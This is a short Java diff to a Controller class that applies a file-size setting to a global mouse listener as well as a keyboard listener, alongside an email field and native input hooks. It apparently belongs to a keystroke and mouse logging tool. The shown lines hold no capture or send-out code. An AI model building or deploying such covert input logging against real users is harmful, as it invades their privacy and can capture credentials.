@@ -99,6 +99,7 @@ public class Controller {
         email = emailField.getText();
         size = new Long(sizeField.getText());
         hookKeyboard.setFileSize(size);
+        hookMouse.setFileSize(size);
         try {
             rewriteConfig();
             init();
@@ -112,6 +113,7 @@ public class Controller {
         hookKeyboard = new GlobalKeyListener();
         hookMouse = new GlobalMouseListener();
         hookKeyboard.setFileSize(size);
+        hookMouse.setFileSize(size);
         try {
             GlobalScreen.registerNativeHook();
         }
